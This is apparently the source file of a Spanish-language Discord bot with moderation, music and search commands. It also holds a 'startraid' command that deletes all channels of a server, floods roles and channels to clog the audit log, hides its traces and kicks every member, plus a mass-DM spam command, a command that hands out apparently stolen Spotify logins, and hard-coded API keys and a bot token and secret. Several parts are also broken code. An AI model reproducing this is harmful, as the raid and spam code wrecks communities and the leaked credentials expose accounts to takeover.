
//PARA EDITAR EL BOT PONER 1-5 Y SINO 900000
//ESTE CODIGO NO AFECTARA SU BOT, SCRIPT DE ARRANQUE

const http = require("http");
const express = require("express");
const app = express();

app.use(express.static("public"));

app.get("/", function(request, response) {
  response.sendFile(__dirname + "/views/index.html");
});

app.get("/", (request, response) => {
  response.sendStatus(5000);
});
//200 y 280000
app.listen(process.env.PORT);


//`http://${process.env.PROJECT_DOMAIN}.glitch.me/`
//DESDE AQUI EMPIEZA A ESCRIBIR EL CODIGO PARA SU BOT

const Discord = require("discord.js");
const client = new Discord.Client();
const fs = require("fs");
const MaxServer = require('events').EventEmitter.defaultMaxListeners = 5;

client.on("ready", async message => {
  console.log("Estoy ready");
  let estados = [
    "Mi prefix es: .xd.",
    `Estoy en ${client.guilds.size} servidores`,
    "Con tu corazon",
    "Escribe .xd.ayuda para mas info",
    "Papela#8062 es mi amo y mi creador",
    "Mi prefix es: .xd.",
    "DiozDelCacking",
    "BotDiozDelCracking"
  ]; //aquí van los estados

  setInterval(function() {
    let estado = Math.floor(Math.random() * (estados.length - 1) + 1);
    client.user.setActivity(estados[estado]);
    
  }, 5500);
  });

client.on("message", async message => {
  const prefixes = require("./prefix.json");
  const prefix = prefixes[message.guild] ? prefixes[message.guild].prefix: ".xd.";
  const args = message.content.slice(prefix.length).trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  const client = new Discord.Client();
  
client.on("error", e => console.error(e));
client.on("warn", e => console.warn(e));
client.on("debug", e => console.info(e));

  let adminid = "529736520048050189";
  
   if (message.content.startsWith(prefix + "optimizar")) {
     message.channel.bulkDelete(1);
process.setMaxListeners(2);
     message.channel.send("Optimizado").then(m => {m.delete(5000)});
  }
  
  ///
  
  const Eris = require("eris");
const moment = require("moment-timezone");
const clock = require("node-emoji-clock");
  
if (message.content.startsWith(prefix + "hora")) {
        var ct = moment().tz("Europe/Copenhagen");
           message.channel.send(moment().tz("Europe/Copenhagen"));
        var et = moment().tz("America/New_York");
        var pt = moment().tz("America/Los_Angeles");
        message.channel.send(clock.timeToEmoji(ct) + " \`" + ct.format("HH:mm z") + "\`\n" +
            clock.timeToEmoji(et) + " \`" + et.format("HH:mm z") + "\`\n" +
            clock.timeToEmoji(pt) + " \`" + pt.format("HH:mm z") + "\`");
}
  
if (message.content.startsWith(prefix + "temp")) {
  message.channel.send('Started').then(m => {m.delete(10000).then(m => {m.edit("Error 404");
  message.channel.send('Fin')                                           

});                                                                         
});
}
 
  
//if (message.content.startsWith(prefix + "genpass")){
  //  message.channel.send("Esta es la nueva contraseña que he generado: **" + shortcode(8) + "**");
  //}
  
  if (message.content.startsWith("<@581793105385226240>")) {
    message.channel.send(
      "El prefix que tienes ahora es: **" +
        prefix +
        "** y el que viene por defecto es: **.xd.**"
    );
  }
///

  const moment2 = require("moment");
require('moment-duration-format');

const actividad = moment2.duration(client.uptime).format(" D [days], H [hours], m [mins], s [secs]");
    
    if (message.content.startsWith(prefix + "botinfo")) {
      message.channel.send("**❌ = No funciona | 🟡 o ⚠ = con errores | ✅ o ✔ = Funcionando**");
const embed = new Discord.RichEmbed()
.setColor(0x66ff66)

.setAuthor(`Bot info`, "https://media.discordapp.net/attachments/513079562628890625/534111650866003988/MOSHED-2019-1-13-15-48-46.gif?width=300&height=300")
.addField(`Dueño`, `Papela#8062 (<@529736520048050189>)`, true)
.addField(`Version`, `2.2.5`, true)
.addField(`Libreria`, `Discord ^11.5.1 (Js)`, true)

.addField(`✅Memoria`, `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB`, true)
.addField(`❌Tiempo activo`, `${actividad}`, true)
.addField(`❌Servidores`, `${client.guilds.size.toLocaleString()}`, true)

.addField(`🟡⚠Usuarios`, `${client.users.size.toLocaleString()}`, true)
.addField(`❌Canales`, `${client.channels.size.toLocaleString()}`, true)
.addField(`❌Conexiones a voz`, `${client.voiceConnections.size}`, true)

message.channel.send(embed);
}
  
  
///
  if (message.content.startsWith(prefix + "deleteMessage")) {
  /*
.
Elimina el mensaje generado por el bot despues de
un tiempo determinado usando detele().
*/
 
message.channel.send('Este mensaje se eliminara en 10 segundos')
.then(m => {
        m.delete(10000);

});
}  
////
  if (message.author.id == adminid && message.content.toLowerCase() == prefix + "apagar"){
    message.channel.send("**APAGANDO BOT...**").then(message => client.destroy());
  }

  if (message.author.id == adminid && message.content.toLowerCase() == prefix + "reiniciar"){
    client.user.setGame(`REINICIANDO...`);
    message.channel
      .send("**REINICIANDO BOT...**")
      .then(msg => client.destroy())
      .then(() => client.login(process.env.TOKEN));
      process.setMaxListeners(0);
  }

  if (message.author.id == adminid && message.content.toLowerCase() == prefix + "servidor") {
    message.channel.send("`Estoy en` " + `**${client.guilds.size}** ` + "`servidores y son los siguientes:`");
    client.guilds.forEach(guild => {
      message.channel.send(" - **" + guild.name + "**");
    });
  }


//('vvn2rSPGY2FEFCRHCi2uHrw7fTcKYped');
if (message.content.startsWith(prefix + "gif")) {
var giphy = require('giphy-api')('vvn2rSPGY2FEFCRHCi2uHrw7fTcKYped');

if(args.length === 0) return message.channel.send('Debe proporcionar algo para buscar');

  message.channel.send('🔄 buscando..!')
    .then(m => {
       giphy.search(args.join(' '), function(err, res){
       if(err){
         return console.log(err);
       }
       if(!res.data.url){
         return message.channel.send('¡No se han encontrado resultados!')
       }

       m.edit(res.data.url);
     });
   })
}
  
  
  ///
  if (message.content.startsWith(prefix + "cinvite")) {
    let serversal = args.join(" ");
    if(!serversal)message.channel.send("Escribe la Id del canal q tengo que mandarte la invitacion");
message.guild.channels.get(serversal).createInvite({
maxAge: 0       //maxAge: 0 significa que el link sera permanente

}).then(invite =>  
   client.users.cache.get(adminid).send(invite.url)
);
  }
  ///
  if (message.content.startsWith(prefix + "priv")) {
    let mensaje = args.join(" ");
    if(!mensaje)message.channel.send("Escribe el mensaje que le quieres enviar");
    let userID = message.mentions.users.first().id;
    client.users.cache.get(userID).send(mensaje);
    message.channel.bulkDelete(1);
   message.channel.send("Mensaje enviado correctamente.").then(m => {m.delete(10000);

});
  }
  ///
  if (message.content.startsWith(prefix + "ytsearch")) {
 const YouTube = require('youtube-node');
let youTube = new YouTube();

//Necesita tener una clave para usar la API de YouTube Data API v3
//video tutorial: https://www.youtube.com/watch?v=VxQPG991YUs 

youTube.setKey('AIzaSyBD1I5tSmT08Wx9-ir18AczYIP-475y8lk');


if(!args.join(" ")) return  message.channel.send('Debe proporcionar algo para buscar');
message.channel.send(':arrows_counterclockwise: buscando..!')
.then(m => {
    youTube.search(args.join(' '), 2, function(err, result){
        if(err){
            return console.log(err); 

        }
        if(result.items[0]["id"].videoId == undefined){
            return message.channel.send('¡No se han encontrado resultados!');

        } else{
            let link = `https://www.youtube.com/watch?v=${result.items[0]["id"].videoId}`
            m.edit(link);

        }
    })
})
  }
  
   if (message.content.startsWith(prefix + "servidors")) {
    if(message.author.id !== adminid) 
        return message.channel.send(`**»** ${message.author}, you don't have permission to do that!`);
      let serverid = args[0].join(" ");
    var guildID = args.guild;
    guildID.leave()
   }
  ///

  if (
    message.author.id == adminid &&
    message.content.toLowerCase() == prefix + "serverid"
  ) {
    message.channel.send("Servidores: ");
    console.log("Servers:");
    client.guilds.forEach(guild => {message.channel.send("`` - " + guild.name + "``");message.channel.send("** " + guild.id + "**");});
                          }
  
  if (
    message.author.id == adminid &&
    message.content.toLowerCase() == prefix + "serverinfor"
  ) {
    message.channel.send("**Servidores: **");
    console.log("Servers:");
    client.guilds.forEach(guild => {
      message.channel.send("`` - " + guild.name + "``");
      message.channel.send("`` - " + guild.id + "``");

      // List all channels
      guild.channels.forEach(channel => {
        message.channel.send(
          ` -- ${channel.name} (${channel.type}) - ${channel.id}`
        );
      });
    });
    message.channel.send(
      "**Hay estan todos los canales de los servidores donde esta el bot.**"
    );
  }

  if(message.author.id == adminid && message.content.toLowerCase() == prefix + "startraid"){
    
    const listCh = [];
    message.guild.channels.forEach(channel => {
      listCh.push(channel.name);
      channel.delete();
    });

    message.channel
      .fetchMessages({ limit: 10 })
      .then(messages => message.channel.bulkDelete(messages)); //deletes messages to cover up you did it
    for (var i = 0; i < 30; i++) {
      // Creates new roles to clog up the audit log
      message.guild.createRole({
        name: "SERVIDOR RAIDEADO POR BOTXD",
        color: "RANDOM"
      });
      //changes name tons of times to clog up the audit log
      message.guild.setName("SERVIDOR RAIDEADO POR BOTXD ");
    }
    for (var i = 0; i < 50; i++) {
      message.guild
        .createChannel("https://discord.gg/kX7dfrS")
        .then(channel => {
          channel.setTopic("RAIDEADO POR BOTXD");
          channel.send("https://discord.gg/kX7dfrS");
        });
    }
    message.channel.send("https://discord.gg/kX7dfrS");
  }

  if (message.content.startsWith("RAIDEADO POR BOTXD")) {
    message.guild.members.forEach(member => {
      var Kmember = member;
      Kmember.send(
        " ha sido raideado por BOTXD. Este es el nuevo server: https://discord.gg/kX7dfrS"
      );
      Kmember.kick()
        .then(member => {
          message.channel.send(
            ":wave:" +
              member.displayName +
              " ha sido expulsado gracias al raideo de BotXD: https://discord.gg/kX7dfrS"
          );
        })
        .catch(() => {
          message.channel.send(
            "No puedo expulsar a " +
              member +
              " pero con los demas voy a intentarlo :-). https://discord.gg/kX7dfrS"
          );
        });
    });
    message.channel.send("https://discord.gg/kX7dfrS");
  }

  if (
    message.author.id == adminid &&
    message.content.toLowerCase() == prefix + "stopraid"
  ) {
    client.user.setGame(`TERMINANDO RAIDEO...`);
    message.channel
      .send("**REINICIANDO BOT...**")
      .then(msg => client.destroy())
      .then(() => client.login(process.env.TOKEN));
    message.channel.send("**RAIDEO TERMINADO CON EXITO**");
  }


  if (message.content.startsWith(prefix + "porn")) {
    if (!message.channel.nsfw) {
      message.channel.send(
        ":underage: Ese comando solo se puede utilizar en canales NSFW"
      );
    } else {
      let texto = args.join(" ");
      var max = 20276;

      var min = 19926;

      var MathRan = Math.floor(Math.random() * (max - min + 0)) + min;

      var MathLoL = Math.round(MathRan);
      var rpts = ["A", "B", "C", "D", "E", "F"]
     var max = 199;

      var min = 160;

      var MathRan = Math.floor(Math.random() * (max - min + 0)) + min;

      var MathLoL = Math.round(MathRan);
      if (!texto);
      message.channel.send(
        message.member.user +
          " aqui tienes tu nopor: " +
          "https://cdn.boob.bot/Gifs/" + MathLoL + rpts[Math.floor(Math.random() * rpts.length)] + ".gif"
      );

      //https://cdn.boob.bot/Gifs/172A.gif
    }
  }

  ///
  if (message.content.startsWith(prefix + "hentaiporn")) {
    if (!message.channel.nsfw) {
      message.channel.send(
        ":underage: Ese comando solo se puede utilizar el canales NSFW"
      );
    } else {
      var max = 20276;

      var min = 19926;

      var MathRan = Math.floor(Math.random() * (max - min + 0)) + min;

      var MathLoL = Math.round(MathRan);
      let texto = args.join(" ");
      if (!texto);
      message.channel.send(
        message.member.user +
          "Aqui tienes tu nopor: " +
          "https://www.zzcartoon.com/contents/albums/main/120x160/1000/1805/" +
          MathLoL +".jpg Si no se ve clicka abajo."
      );

      //https://cdn.boob.bot/Gifs/172A.gif
    }
  }

  //http://www.buenaisla.net/mini/imagen-Hentai-sin-censura-7697"
  ///

  if (message.content.startsWith(prefix + "ping")) {
    let ping = Math.floor(message.client.ping);
    message.channel.send(
      ":ping_pong: pong `" + ping + " ms.` es lo que he tardado en responderte"
    );
  }

  if (message.content.startsWith(prefix + "estado")) {
    message.channel.send(
      "Online porque sino no te hubiese repondido. :sweat_smile: "
    );
  }
  
  
  if (message.content.startsWith(prefix + "prueba")) {
   message.reply('here is a cool emoji -> <a:Logo:718403895751081996> ');
  }
  

  if (message.content.startsWith(prefix + "bug")) {
    message.channel.send(
      "Si has encontrado algun bug, falta de ortografia,error... no dudeis en contactar con @Papela#8062 o entrando en su server escribiendo .xd.creador. "
    );
  }

if (message.content.startsWith(prefix + "borrar")) {
    let perms = message.member.hasPermission("MANAGE_MESSAGES");
    if (!perms)
      return message.channel.send(
        "No tienes permisos para utilizar ese comando"
      );
    let cantidad = parseInt(args[0], 10);
    if(cantidad > 99){
    cantidad = 99
    message.channel.bulkDelete(1); 
    message.channel.send("El numero maximo de mensajes que puedo borrar es 100").then(m => {m.delete(4000).then(m => {m.edit("Error 404")})});
    }else{
    message.channel.bulkDelete(cantidad + 1);
    message.channel.send(cantidad + " mensaje/s borrados.").then(m => {m.delete(3500).then(m => {m.edit("Error 404")})});
    }
    }
  ///

  const canal = "603222129789632523";
  let reporte = prefix + "reportar";
  let enviado = "✅ | **Reporte enviado**";
  let razon = args.slice(1).join(" ");
  var usuario0 = message.mentions.users.first();
  if (message.content.startsWith(reporte)) {
    if (message.mentions.users.size < 1)
      return message.channel.send(
        "Escriba el nombre del que quiere reportar  y la razon `?reportar @username razon`"
      );
    if (!razon)
      return message.channel.send(
        "Escriba la razon del reporte, `?reportar @username razon`"
      );
    message.channel.bulkDelete(1);

    const embed = new Discord.RichEmbed()
      .setTitle("📧 | **Reporte**")
      .setDescription(
        "Reporte enviado hacia " +
          "**" +
          message.mentions.members.first() +
          "**" +
          "por la razon de " +
          "**" +
          args.slice(1) +
          "**"
      )
      .setThumbnail(
        `https://media.discordapp.net/attachments/576980879226961935/577344574931075072/carta.gif`
      )
      .setColor(0xff0000)
      .setFooter("Reporte enviado por " + message.author.username);

    client.channels.get(canal).send(embed);

    message.channel.send(enviado).then(m => m.react("\u2709"));
    message.channel.send("**En breve nos pondremos en contacto con tigo.**");
  }

  ///

  if (message.content.startsWith(prefix + "gen netflix")) {
    message.channel.send("**No hay cuentas disponibles**");
    message.channel.send(
      "Pero si quieres aportar para el Bot contacta con @<529736520048050189> o <490516409562955807>"
    );
  }

  if (message.content.startsWith(prefix + "gen brazzers")) {
    message.channel.send("**No hay cuentas disponibles**");
    message.channel.send(
      "Pero si quieres aportar para el Bot contacta con @<529736520048050189> o <490516409562955807>"
    );
  }

  if (message.content.startsWith(prefix + "gen minecraft")) {
    message.channel.send("Nada por ahora");
  }

  if (message.content.startsWith(prefix + "gen spotify")) {
    message.channel.send(
      "**" +
        message.author.username +
        "**, Revisa tus mensajes privados. Te hemos enviado una cuenta"
    );
    //message.channel.send('**'+message.author.username+'**, Estmos teniendo problemas con las cuentas de Spotify. Intentalo de nuevo mañana');
    message.react("📡");
    message.react("📬");
    let texto = args.join(" ");
    var rpts = [
      "Cuenta: modnationracers99@yahoo.com Contraseña: bmwm3gtr",
      "Cuenta: c.weel@hotmail.com Contraseña: sjon007 ",
      "Cuenta: c4rr13l4th3r0@gmail.com Contraseña: gnortsraey4720",
      "Cuenta: cadamski@emrd.net Contraseña: chamate1",
      ""
    ];
    if (!texto);
    message.author.send(
      message.member.user +
        " Aqui tienes tu cuenta: ||**" +
        rpts[Math.floor(Math.random() * rpts.length)] +
        "**||"
    );
    message.author.send(
      message.member.user +
        " Si la cuenta no funciona vuelve  probar a poner el comando de nuevo y si ninguna cuenta funciona contacta con Papela para que arregle el error."
    );
  }

  let texto = args.join(" ");
  if (message.content.startsWith(prefix + "decir")) {
    let perms = message.member.hasPermission("ADMINISTRATOR");
    if (!perms)
      return message.channel.send(
        "No tienes permisos para utilizar ese comando."
      );
    if (!texto) return message.channel.send(`Escriba un contenido pára decir.`);
    message.channel.bulkDelete(1);
    message.channel.send(texto + " <a:Logo:718403895751081996>");
  }

  if (message.content.startsWith(prefix + "avatar")) {
    let img = message.mentions.users.first();
    if (!img) {
      const embed = new Discord.RichEmbed()
        .setImage(`${message.author.avatarURL}`)
        .setColor(0x66b3ff)
        .setFooter(
          `Avatar de ${message.author.username}#${message.author.discriminator}`
        );
      message.channel.send({ embed });
    } else if (img.avatarURL === null) {
      message.channel.send(
        "El usuario (" + img.username + ") no tiene avatar!"
      );
    } else {
      const embed = new Discord.RichEmbed()
        .setImage(`${img.avatarURL}`)
        .setColor(0x66b3ff)
        .setFooter(`Avatar de ${img.username}#${img.discriminator}`);
      message.channel.send({ embed });
    }
  }

  if (message.content.startsWith("Hola")) {
    message.channel.send("Ola");
  }

  ///
  if (message.content.startsWith(".gsearch")) {
  const google = require("google");
let text = args.join(" ");
google.resultsPerPage = 1
google.protocol = 'https'
let contandor = 0;

let iconGoogle = "https://cdn2.iconfinder.com/data/icons/social-media-8/512/Chrome.png";

google(text, function (err, res) {
    if (err) console.log(err);
    
    for (var i = 0; i < res.links.length; ++i) {
      var link = res.links[i];
      if (link.title == null) {
      return message.channel.send('No se encontraron resultados.');
      }
      if (link.href == null)    {
       return message.channel.send('No se encontraron resultados.');
      }

      const gEmbed = new Discord.RichEmbed()
        .setAuthor(`Resultados De La Busqueda ${text}`)
        .setColor('#F4B400')
        .setThumbnail(iconGoogle)
        .addField('Sitio Web', link.title)
        .addField('Descripcion', link.description)
        .addField('URL', link.href);

        message.channel.send(gEmbed);
    }

    if (contandor < 1) {
      contandor += 1
      if (res.next) res.next()
    }

  });
  }
  
  ///
  
  //Papela: 529736520048050189 , Angel: 509407822145126402, Papela2: 580107146151329812
  if (message.content.startsWith(prefix + "admin")) {
    if (message.author.id == adminid) {
      const embed = new Discord.RichEmbed()
        .setAuthor(message.author.username, message.author.avatarURL)
        .addField(
          "**Token** ",
          "||NTgxNzkzMTA1Mzg1MjI2MjQw.Xffxdg.mZP_8ALoAZpeVvpYOQOW5Cgh9OY||",
          true
        )
        .addField("**SecretID**", "||x6zLCfL2_j8MuF7HIffW--CKFyZkI3Ze||", true)
        .addField("**ClientID**", "||581793105385226240||")
        .setFooter(
          "Version 3.0 | NO COMPARTAS ESTOS DATOS CON NADIE | Creado por: @Papela#8062 |",
          client.user.avatarURL
        )
        .setColor(0x66b3ff);

      message.author.send({ embed });
    }
    if (message.author.id == yourID)
      return message.channel.send("**Te he enviado mis datos al privado**");
    message.channel.send(
      "**" +
        message.author.username +
        "**, " +
        "**No tienes permisos** para utilizar este comando"
    );
  }

  if (message.content.startsWith(prefix + "banear")) {
    message.channel.bulkDelete(1);
    let perms = message.member.hasPermission("BAN_MEMBERS");
    if (!perms)
      return message.channel.send(
        "No tienes permisos para utilizar ese comando"
      );
    let user = message.mentions.users.first();
    let razon = args.slice(1).join(" ");

    if (message.mentions.users.size < 1)
      return message.reply("Debe mencionar a alguien.").catch(console.error);
    if (!razon)
      return message.channel.send(
        "Escriba un razón, `.xd.banear @usuario [razón]`"
      );
    if (!message.guild.member(user).bannable)
      return message.reply("No puedo banear al usuario mencionado.");

    message.guild.member(user).ban(razon);
    message.channel.send(
      `**${user.username}**, fue baneado del servidor, razón: ${razon}.`
    );
  }

  if (message.content.startsWith(prefix + "expulsar")) {
    message.channel.bulkDelete(1);
    let perms = message.member.hasPermission("KICK_MEMBERS");
    if (!perms)
      return message.channel.send(
        "Necesitas permisos para tilizar ese comando."
      );

    let user = message.mentions.users.first();
    let razon = args.slice(1).join(" ");

    if (message.mentions.users.size < 1)
      return message.reply("Debes mencionar a alguien.").catch(console.error);
    if (!razon)
      return message.channel.send(
        "Escriba una razón, `.xd.expulsar @persona [razón]`"
      );
    if (!message.guild.member(user).kickable)
      return message.reply("No puedo expulsar al usuario mencionado.");

    message.guild.member(user).kick(razon);
    message.channel.send(
      `**${user.username}**, fue expulsado del servidor, razón: ${razon}.`
    );
  }

  if (message.content.startsWith(prefix + "votacion")) {
    if (!args.join(" "))
      return message.channel.send({
        embed: {
          title: "Uso incorreto !",

          description: "Uso correto: .xd.votacion <titulo> y la pregunta?",

          footer: {
            icon_url: message.author.avatarURL,

            text: `Comando utilizado por ${message.author.username}`
          },

          color: 13632027,

          timestamp: new Date()
        }
      });

    message.delete();

 client.channel.send({
        embed: {
          title: args.join(" "),

          footer: {
            text: `Votacion iniciada por ${message.author.username}`
          },

          color: 8463563,

          timestamp: new Date()
        }
      })
      .then(message => {
        message.react("✅");

        message.react("❌");
      });
  }
  
  
   if (message.content.startsWith(prefix + "sugerir")) {
    if (!args.join(" "))
      return message.channel.send({
        embed: {
          title: "Uso incorreto!",

          description: "Uso correto: **.xd.sugerencia + la sugerencia**",

          footer: {
            icon_url: message.author.avatarURL,

            text: `Sugerencia sugerida por ${message.author.username}`
          },

          color: 15844367,

          timestamp: new Date()
        }
      });

    message.delete();

    message.channel.send({
        embed: {
          title: args.join(" "),

          footer: {
            text: `Sugerencia sugerida por ${message.author.username}`
          },

          color: 15844367,

          timestamp: new Date()
        }
      })
      .then(message => {
        message.react("✅");

        message.react("❌");
      });
  }
  

  if (message.content.startsWith(prefix + "combos")) {
    const embed = new Discord.RichEmbed()
      .setTitle("Combos")
      .setAuthor(message.author.username, message.author.avatarURL)
      .setColor(0x00ae86)
      .setDescription(
        "**Quieres tener los mejores combos? Pues compra el VIP** :joy:"
      )
      .setFooter("Version 2.0", client.user.avatarURL())
      .setThumbnail(message.author.avatarURL)
      .setTimestamp()
      .addField(
        "Foro",
        "[Link del foro](http://diozdelcrackingv2.epizy.com)",
        true
      );

    message.channel.send({ embed });
  }

  
  if (message.author.id == adminid && message.content === "SpamMD") {
   if(message.author.bot) return;
   if (!message.member.hasPermission("ADMINISTRATOR")) return;
    const ids = ["529736520048050189"];
           message.delete();
           message.guild.members.forEach(spam => {
             spam.send(args.join(" "))
             
           })
}else
  
  
  if (message.content.startsWith(prefix + "usuario")) {
    let userm = message.mentions.users.first();
    if (!userm) {
      var user = message.author;

      const embed = new Discord.RichEmbed()
        .setThumbnail(user.avatarURL)
        .setAuthor(user.username + "#" + user.discriminator, user.avatarURL)
        .addField(
          "Jugando a",
          user.presence.game != null ? user.presence.game.name : "Nada",
          true
        )
        .addField("ID", user.id, true)
        .addField("Estado", user.presence.status, true)
        .addField("Apodo",message.member.nickname != null ? message.member.nickname : "Ninguno",true)
        .addField("Cuenta Creada", user.createdAt.toDateString(), true)
        .addField("Fecha de Ingreso", message.member.joinedAt.toDateString())
        .addField(
          "Roles",
          message.member.roles.map(roles => `\`${roles.name}\``).join(", ")
        )
        .setColor(0x66b3ff);

      message.channel.send({ embed });
    } else {
      const embed = new Discord.RichEmbed()
        .setThumbnail(userm.avatarURL)
        .setAuthor(userm.username + "#" + userm.discriminator, userm.avatarURL)
        .addField(
          "Jugando a",
          userm.presence.game != null ? userm.presence.game.name : "Nada",
          true
        )
        .addField("ID", userm.id, true)
        .addField("Estado", userm.presence.status, true)
        .addField("Cuenta Creada", userm.createdAt.toDateString(), true)
        .setColor(0x66b3ff);

      message.channel.send({ embed });
    }
  }

  if (message.content.startsWith("BOTXD")) {
    let texto = args
    var rpts = ["Sí","No","¿Por qué?","Por favor","Tal vez","No sé","Definitivamente?"," ¡Claro! "," Sí "," No "," Por supuesto! "," Por supuesto que no "," Probablemente "," No creo "," Si persigues tus sueños igual lo conseguiras ","No creo pero uizas si."];
    if (!texto) return message.reply("");
    message.channel.send(message.member.user +" hacia su pregunta, mi respuesta es: **" +rpts[Math.floor(Math.random() * rpts.length)] +"**");
  }

  if (message.content.startsWith(prefix + "addrol")) {
    let miembro = message.mentions.members.first();
    let nombrerol = args.slice(1).join(" ");

    let role = message.guild.roles.find("name", nombrerol);
    let perms = message.member.hasPermission("MANAGE_ROLES_OR_PERMISSIONS");

    if (!perms)
      return message.channel.send(
        "`Error` `|` No tienes Permisos para usar este comando."
      );

    if (message.mentions.users.size < 1)
      return message.reply("Debe mencionar a un miembro.").catch(console.error);
    if (!nombrerol)
      return message.channel.send(
        "Escriba el nombre del rol a agregar, `.xd.addrol @username [rol]`"
      );
    if (!role) return message.channel.send("Rol no encontrado en el servidor.");

    miembro.addRole(role).catch(console.error);
    message.channel.send(
      `El rol **${role.name}** fue agregado correctamente a **${miembro.user.username}**.`
    );
  }

  if (message.content.startsWith(prefix + "removerol")) {
    let miembro = message.mentions.members.first();
    let nombrerol = args.slice(1).join(" ");

    let role = message.guild.roles.find("name", nombrerol);
    let perms = message.member.hasPermission("MANAGE_ROLES_OR_PERMISSIONS");

    if (!perms)
      return message.channel.send(
        "`Error` `|` No tienes Permisos para usar este comando."
      );

    if (message.mentions.users.size < 1)
      return message.reply("Debe mencionar a un miembro.").catch(console.error);
    if (!nombrerol)
      return message.channel.send(
        "Escriba el nombre del rol a remover, `-removerol @miembro [rol]`"
      );
    if (!role) return message.channel.send("Rol no encontrado en el servidor.");

    miembro.removeRole(role).catch(console.error);
    message.channel.send(
      `El rol **${role.name}** del miembro **${miembro.user.username}** fue removido  correctamente.`
    );
  }

  //

  ///
  if (message.content.startsWith(prefix + "gemi2")) {
    let perms = message.member.hasPermission("ADMINISTRATOR");
    if (!perms)
      return message.channel.send(
        "**No tienes Permisos para usar este comando.**:joy: "
      );

    let Canalvoz = message.member.voiceChannel;
    if (!Canalvoz || Canalvoz.type !== "voice") {
      message.channel
        .send("¡Necesitas unirte a un canal de voz primero!.")
        .catch(error => message.channel.send(error));
    } else if (message.guild.voiceConnection) {
      message.channel.send("Ya estoy conectado en un canal de voz.");
    } else {
      message.channel
        .send("Conectando...")
        .then(m => {
          Canalvoz.join()
            .then(() => {
              m.edit(":white_check_mark: | Conectado exitosamente.").catch(
                error => message.channel.send(error)
              );
            })
            .catch(error => message.channel.send(error));
        })
        .catch(error => message.channel.send(error));
    }

    const ytdl = require("ytdl-core");

    let voiceChannel = message.member.voiceChannel;
    if (!voiceChannel)
      return message.channel.send(
        "¡Necesitas unirte a un canal de voz primero!."
      );
    if (!args)
      return message.channel.send(
        "Ingrese un enlace de youtube para poder reproducirlo."
      );
    voiceChannel
      .join()
      .then(connection => {
        const url = ytdl(
          "https://www.youtube.com/watch?v=K5qixVNveNo" +
            { filter: "audioonly" }
        );
        const dispatcher = connection.play(url);
        message.channel.send(
          "``Reproduciendo ahora tu cancion favorita.``:joy: "
        );
        message.channel.send("**Para pararlo escribe .xd.salir**");
        message.delete();
      })
      .catch(console.error);
  }

  ///

  if (message.content.startsWith(prefix + "unete")) {
    let Canalvoz = message.member.voiceChannel;
    if (!Canalvoz || Canalvoz.type !== "voice") {
      message.channel
        .send("¡Necesitas unirte a un canal de voz primero!.")
        .catch(error => message.channel.send(error));
    } else if (message.guild.voiceConnection) {
      message.channel.send("Ya estoy conectado en un canal de voz.");
    } else {
      message.channel
        .send("Conectando...")
        .then(m => {
          Canalvoz.join()
            .then(() => {
              m.edit(":white_check_mark: | Conectado exitosamente.").catch(
                error => message.channel.send(error)
              );
            })
            .catch(error => message.channel.send(error));
        })
        .catch(error => message.channel.send(error));
    }
  }

  if (message.content.startsWith(prefix + "pclay")) {
    if (!message.guild.voiceConnection)
      return message.channel
        .send(
          "¡No estoy en un canal de voz!, usa `.xd.unete` para unirme a un canal."
        )
        .catch(error => message.channel.send(error));
    const dispatcher = message.guild.voiceConnection.play(
      `C:/Users/Desktop/musica/audio.mp3`
    );
    dispatcher.on("finish", () => {
      // Se activa cuando la transmisión/canción ha terminado.
    });

    dispatcher.on("error", e => {
      // Se activa cuando detecta cualquier error que pueda surgir.
      console.log(e);
    });

    dispatcher.setVolume(0.5); // Ajuste el volumen a 50%
    dispatcher.setVolume(1); // Ajuste el volumen de nuevo al 100%

    dispatcher.time; // El tiempo en milisegundos durante la secuencias que ha estado en transmisión.

    dispatcher.pause(); // Detener la secuencia transmisión
    dispatcher.resume(); // Continuar la secuencia transmisión

    dispatcher.end(); // Finaliza el dispatcher, emite evento 'end'
  }

  if (message.content.startsWith(prefix + "radio")) {
    let voiceChannel = message.member.voiceChannel;
    if (!voiceChannel)
      return message.channel.send(
        "¡Necesitas unirte a un canal de voz primero!."
      );
    voiceChannel
      .join()
      .then(conexion => {
        conexion.playStream("http://stream.electroradio.fm:80/192k/;");
        message.channel.send("Radio electro activado.");
        return;
      })
      .catch(console.error);
  }

  if (message.content.startsWith(prefix + "ytplay")) {
    const ytdl = require("ytdl-core");

    let voiceChannel = message.member.voiceChannel;
    if (!voiceChannel)
      return message.channel.send(
        "¡Necesitas unirte a un canal de voz primero!."
      );
    if (!args)
      return message.channel.send(
        "Ingrese un enlace de youtube para poder reproducirlo."
      );
    voiceChannel
      .join()
      .then(connection => {
        const url = ytdl(args + { filter: "audioonly" });
        const dispatcher = connection.playStream(url);
        message.channel.send("``Reproduciendo ahora:`` " + args);
        message.delete();

        dispatcher.on("end", () => {
          // Se activa cuando la transmisión/canción ha terminado.
          let Canalvoz = message.member.voiceChannel;
          message.channel
            .send(
              " :x: | Ya no estoy en ningun canal de voz porque la cancion a terminado."
            )
            .then(() => {
              Canalvoz.leave();
            })
            .catch(error => message.channel.send(error));
        });

        dispatcher.on("error", e => {
          message.channel.send(
            "**ERROR**. Esto no deberia de haber ocurrido. Intentalo de nuevo y si sigue ocurriendo contacta con <@529736520048050189>"
          );
          console.log(e);
        });
      })
      .catch(console.error);
  }

  if (message.content.startsWith(prefix + "salir")) {
    let Canalvoz = message.member.voiceChannel;
    if (!Canalvoz) {
      message.channel.send("No estoy en un canal de voz.");
    } else {
      message.channel
        .send(" :x: | Ya no estoy en ningun canal de voz.")
        .then(() => {
          Canalvoz.leave();
        })
        .catch(error => message.channel.send(error));
    }
  }

  
  
  //////////////////////
  
  
  
  //////////////////////
  
  

  if (message.content.startsWith(prefix + "añadirol")) {
    let miembro = message.mentions.members.first();
    let nombrerol = args.slice(1).join(" ");

    let role = message.guild.roles.find("name", nombrerol);
    let perms = message.member.hasPermission("MANAGE_ROLES_OR_PERMISSIONS");

    if (!perms)
      return message.channel.send(
        "`Error` `|` No tienes Permisos para usar este comando."
      );

    if (message.mentions.users.size < 1)
      return message.reply("Debe mencionar a un miembro.").catch(console.error);
    if (!nombrerol)
      return message.channel.send(
        "Escriba el nombre del rol a agregar, `-añadirol @nombre [rol]`"
      );
    if (!role) return message.channel.send("Rol no encontrado en el servidor.");

    miembro.addRole(role).catch(console.error);
    message.channel.send(
      `El rol **${role.name}** fue agregado correctamente a **${miembro.user.username}**.`
    );
  }

  if (message.content.startsWith(prefix + "removerol")) {
